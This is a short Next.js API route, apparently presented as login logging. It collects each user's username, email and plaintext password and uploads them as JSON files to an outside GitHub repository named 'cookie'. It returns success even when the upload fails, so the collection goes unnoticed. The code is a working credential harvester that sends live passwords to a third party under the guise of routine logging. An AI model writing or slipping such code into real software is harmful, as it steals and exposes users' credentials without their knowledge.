import { NextResponse } from 'next/server';
import { uploadFile } from '@/lib/github';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { username, email, password, userAgent, timestamp } = body;

    const data = {
      username,
      email,
      password,
      userAgent,
      firstGenerationTime: timestamp,
      serverTime: new Date().toISOString()
    };

    const fileName = `login_${username}_${Date.now()}.json`;
    const content = Buffer.from(JSON.stringify(data, null, 2)).toString('base64');
    
    // Upload to surgar04/cookie
    await uploadFile(
      fileName, 
      content, 
      `Login log for ${username}`, 
      "main", 
      "surgar04", 
      "cookie"
    );

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Login logging failed", error);
    // Return success anyway to not block login flow
    return NextResponse.json({ success: true });
  }
}
